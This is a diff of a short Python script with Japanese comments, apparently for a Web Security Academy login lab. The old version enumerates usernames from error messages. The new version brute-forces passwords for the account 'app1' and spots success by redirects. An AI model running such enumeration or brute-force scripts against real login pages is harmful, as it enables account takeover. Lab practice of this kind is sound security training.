@@ -1,27 +1,27 @@
 import requests
-import re
 
-URL = "https://0ab800b004ada1ab80a2909700c20046.web-security-academy.net/login"
+URL = "https://0ac6006a032ad961806a85a700f6008d.web-security-academy.net/login"
 
-with open("users.txt", "r") as f:
-    usernames = f.read().splitlines()
+with open("pw.txt", "r") as f:
+    pws = f.read().splitlines()
 
 print("[*] ユーザー名の列挙（Enumeration）を開始します！")
 
 
 
-for username in usernames:
+for pw in pws:
     data = {
-        "username": username,
-        "password": "DummyPassword123!"
+        "username": "app1",
+        "password": pw
     }
-    
-    # SessionもCSRFトークンも不要です！シンプルにPOSTを撃ち込みます！
-    response = requests.post(URL, data=data)
-    
-    # HTMLから、エラーメッセージのテキスト部分だけを正規表現で抽出します！
-    error_match = re.search(r'<p class="is-warning">(.*?)</p>', response.text)
-    
-    error_msg = error_match.group(1) if error_match else "エラーなし"
-    
-    print(f"ユーザー名: {username:15} | エラー内容: {error_msg}")
+
+    # リダイレクト有無を判定するため、POST後に自動追従しない
+    response = requests.post(URL, data=data, allow_redirects=False, timeout=10)
+
+    is_redirect = response.is_redirect or response.is_permanent_redirect
+    location = response.headers.get("Location", "-")
+
+    print(
+        f"password: {pw:15} | redirect: {is_redirect!s:5} "
+        f"| status: {response.status_code} | location: {location}"
+    )
